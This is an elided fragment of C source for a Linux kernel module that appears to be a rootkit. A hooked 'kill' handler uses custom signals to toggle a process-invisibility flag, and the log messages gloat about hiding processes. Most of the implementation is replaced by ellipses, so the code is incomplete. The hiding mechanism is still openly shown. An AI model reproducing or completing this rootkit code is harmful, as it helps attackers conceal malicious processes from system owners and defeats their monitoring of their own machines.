...
hacked_kill(pid_t pid, int sig)
{
	...
	switch (sig) {
		case SIGINVIS:
			...
			printk(KERN_INFO "kit: process invisible >:-)\n");
			break;
		case SIGVIS:
			if ((task = find_task(pid)) == NULL || is_invisible(pid) == false)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			printk(KERN_INFO "kit: process visible :-(\n");
			break;
		default:
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
...
kit_cleanup(void)
{
	...
	printk(KERN_INFO "kit: Unloaded :-(\n");
}

module_init(kit_init);
module_exit(kit_cleanup);
